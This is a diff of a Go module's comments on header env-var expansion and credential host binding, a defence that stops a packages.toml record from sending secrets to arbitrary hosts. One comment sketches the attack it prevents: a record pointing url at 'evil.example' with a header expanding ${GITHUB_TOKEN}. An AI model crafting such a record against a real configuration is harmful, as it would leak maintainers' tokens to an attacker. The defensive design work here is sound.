@@ -9,7 +9,7 @@ import (
 	"strings"
 )
 
-// Header env-var expansion allow-list (S001-R1, AD-8).
+// Header env-var expansion allow-list.
 //
 // A malicious packages.toml must not be able to exfiltrate arbitrary process
 // secrets (e.g. ANTHROPIC_API_KEY) by embedding ${VAR} in any header value.
@@ -18,8 +18,8 @@ import (
 //  1. the header name must be one of a small fixed set of auth headers, and
 //  2. the referenced environment variable must be explicitly allow-listed
 //     (either a known token name or carry the BENTOO_ prefix), except
-//     bentoolkit's own secrets, which are never expandable (S052-R1.9), and
-//     the BENTOO_FETCH_* authenticated-fetch secrets (S068-R3.1).
+//     bentoolkit's own secrets, which are never expandable, and the
+//     BENTOO_FETCH_* authenticated-fetch secrets.
 //
 // There is intentionally NO escape hatch: a user that needs another variable
 // expanded must rename it to BENTOO_*. The constants below are package-private
@@ -39,9 +39,9 @@ var allowedExpansionHeaders = map[string]struct{}{
 // expanded inside an allow-listed header value even though they do not carry the
 // allowedHeaderEnvPrefix.
 //
-// OPENAI_API_KEY and ANTHROPIC_API_KEY are deliberately absent (S052-R3): they
-// are the maintainer's LLM keys, and no upstream a package record names has a
-// reason to receive them. A record that needs such a key renames it to BENTOO_*.
+// OPENAI_API_KEY and ANTHROPIC_API_KEY are deliberately absent: they are the
+// maintainer's LLM keys, and no upstream a package record names has a reason to
+// receive them. A record that needs such a key renames it to BENTOO_*.
 var allowedHeaderEnvAllowList = map[string]struct{}{
 	"GITHUB_TOKEN": {},
 	"GITLAB_TOKEN": {},
@@ -103,11 +103,11 @@ const (
 // isReservedBentooSecret reports whether name is one of bentoolkit's own
 // secrets: the ntfy token and SMTP password (internal/snapshot/notify.go) or a
 // per-repository token. They carry the BENTOO_ prefix, yet must never be
-// expanded into a header (S052-R1.9): R1.4 binds a BENTOO_* variable to the
-// host of the record's own url, and the record's author picks that url, so a
-// packages.toml PR could otherwise send them to a host of its choosing.
+// expanded into a header: credential host binding ties a BENTOO_* variable to
+// the host of the record's own url, and the record's author picks that url, so
+// a packages.toml PR could otherwise send them to a host of its choosing.
 // Authenticated-fetch secrets (authFetchSecretPrefix, bare prefix included) are
-// reserved too: they travel only to their own record's fetch_url (S068-R3.1).
+// reserved too: they travel only to their own record's fetch_url.
 func isReservedBentooSecret(name string) bool {
 	switch name {
 	case "BENTOO_NTFY_TOKEN", "BENTOO_SMTP_PASSWORD":
@@ -121,27 +121,23 @@ func isReservedBentooSecret(name string) bool {
 		strings.HasSuffix(name, repoVarNameSuffix)
 }
 
-// Credential host binding (S052-R1).
+// Credential host binding.
 //
-// The allow-list above decides WHETHER a variable may be expanded; it says
-// nothing about WHERE the result goes. packages.toml lives in the overlay
-// repository, so without a binding one contributor record pairing
-// url = "https://evil.example" with X-Api-Key = "${GITHUB_TOKEN}" would ship the
-// maintainer's token to that host. Every allow-listed variable is therefore
-// bound to a set of hosts, and a request to any other host is refused before
-// it is built into a network call:
+// The allow-list above decides WHETHER a variable may be expanded, not WHERE
+// the result goes. packages.toml lives in the overlay repository, so without a
+// binding a contributor record pairing url = "https://evil.example" with
+// X-Api-Key = "${GITHUB_TOKEN}" would ship the maintainer's token there. Each
+// allow-listed variable is bound to a set of hosts; a request to any other host
+// is refused before it is built:
 //
-//   - GITHUB_TOKEN: https only, and exactly the hosts in githubCredentialHosts.
-//   - GITLAB_TOKEN: https only, and exactly gitlab.com. A self-hosted GitLab
-//     uses a BENTOO_* variable instead.
-//   - BENTOO_*: the package's own hosts (its url and base_url, see
-//     credentialScope), by hostname only — a user's own server may be plain
-//     http, so the scheme is not checked.
+//   - GITHUB_TOKEN: https only, exactly the hosts in githubCredentialHosts.
+//   - GITLAB_TOKEN: https only, exactly gitlab.com (self-hosted: use BENTOO_*).
+//   - BENTOO_*: the package's own url and base_url hosts (credentialScope), by
+//     hostname only — a user's own server may be plain http.
 //
-// Hostnames are compared with url.URL.Hostname(), case-insensitively and
-// exactly: no subdomain match, port ignored (S052-R1.7). The decision is made
-// from the variable's NAME, never from its value, so a record is refused
-// whether or not the variable is set on the machine running it (S052-R1.6).
+// Hostnames are compared via url.URL.Hostname(), case-insensitively and
+// exactly: no subdomain match, port ignored. The decision uses the variable's
+// NAME, never its value, so a record is refused whether or not it is set.
 
 // githubCredentialHosts is the set of hostnames GITHUB_TOKEN may be sent to.
 var githubCredentialHosts = []string{
@@ -157,14 +153,14 @@ const gitlabCredentialHost = "gitlab.com"
 
 // CredentialScope carries the hostnames a BENTOO_* credential may be sent to:
 // the hosts of the package's own url and base_url, or, for a caller with no
-// package (GetWithHeadersContext), the request's own host (S052-R1.5).
+// package (GetWithHeadersContext), the request's own host.
 type CredentialScope struct {
 	OwnHosts []string
 }
 
 // requestOwnScope is the scope of a request made without a package: the
-// request URL's own hostname is the package host (S052-R1.5). An unparseable
-// URL yields an empty scope, so a BENTOO_* reference to it is refused.
+// request URL's own hostname is the package host. An unparseable URL yields
+// an empty scope, so a BENTOO_* reference to it is refused.
 func requestOwnScope(rawURL string) CredentialScope {
 	u, err := url.Parse(rawURL)
 	if err != nil || u.Hostname() == "" {
@@ -183,7 +179,7 @@ type credentialRef struct {
 // credentialRefs lists, in a deterministic order, every reference in headers
 // that SubstituteEnvVars would be allowed to expand. A reference in a header
 // outside the header allow-list is passed through literally by
-// SubstituteEnvVars, carries no credential, and is not listed (S052-R1.8).
+// SubstituteEnvVars, carries no credential, and is not listed.
 func credentialRefs(headers map[string]string) []credentialRef {
 	names := make([]string, 0, len(headers))
 	for name := range headers {
